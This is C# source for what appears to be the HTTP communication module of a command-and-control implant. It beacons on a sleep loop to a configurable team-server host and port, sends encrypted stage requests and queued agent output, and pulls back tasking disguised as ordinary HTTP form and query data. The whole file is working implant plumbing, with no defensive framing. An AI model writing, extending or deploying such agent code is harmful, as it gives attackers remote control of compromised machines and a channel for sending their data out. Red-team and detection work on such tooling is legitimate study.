using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class HttpCommModule : CommModule
{
    static string ConnectHost;
    static int ConnectPort;
    static int SleepInterval;
    static int SleepJitter;

    public HttpCommModule(string agentID, string connectHost, int connectPort, int sleepInterval, int sleepJitter) : base(agentID)
    {
        ConnectHost = connectHost;
        ConnectPort = connectPort;
        SleepInterval = sleepInterval;
        SleepJitter = sleepJitter;
    }

    public override void Start(CryptoController crypto)
    {
        base.Start(crypto);

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                var interval = SleepInterval * 1000;
                var jitter = SleepJitter;

                CheckIn();

                Thread.Sleep(interval);
            }
        });
    }

    public void SendStageRequest()
    {
        var client = GetWebClient();
        var message = new AgentMessage
        {
            Metadata = base.GetMetadata(),
            Data = new C2Data
            {
                Module = "Core",
                Command = "StageOneRequest"
            }
        };
        var outMessage = Crypto.Encrypt(message);
        var dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
        var uri = new Uri($"http://{ConnectHost}:{ConnectPort}");
        client.UploadDataAsync(uri, Encoding.UTF8.GetBytes(dataToSend));
    }

    private void CheckIn()
    {
        var client = GetWebClient();

        Uri uri;
        byte[] outMessage;
        string dataToSend;

        if (Outbound.Count > 0)
        {
            client.UploadDataCompleted += UploadDataCallBack;
            outMessage = Crypto.Encrypt(Outbound.Dequeue());
            dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
            uri = new Uri($"http://{ConnectHost}:{ConnectPort}");
            client.UploadDataAsync(uri, Encoding.UTF8.GetBytes(dataToSend));
        }
        else
        {
            client.DownloadDataCompleted += DownloadDataCallBack;
            outMessage = Crypto.Encrypt(new AgentMessage { IdempotencyKey = Guid.NewGuid().ToString(), Metadata = base.GetMetadata(), Data = new C2Data { Module = "Core", Command = "NOP" } });
            dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
            uri = new Uri($"http://{ConnectHost}:{ConnectPort}?{dataToSend}");
            client.DownloadDataAsync(uri);
        }

        client.Dispose();
    }

    private void UploadDataCallBack(object sender, UploadDataCompletedEventArgs e)
    {
        try { ProcessTeamServerResponse(e.Result); }
        catch { IncrementRetryCount(); }
    }

    private void DownloadDataCallBack(object sender, DownloadDataCompletedEventArgs e)
    {
        try { ProcessTeamServerResponse(e.Result); }
        catch { IncrementRetryCount(); }
    }
}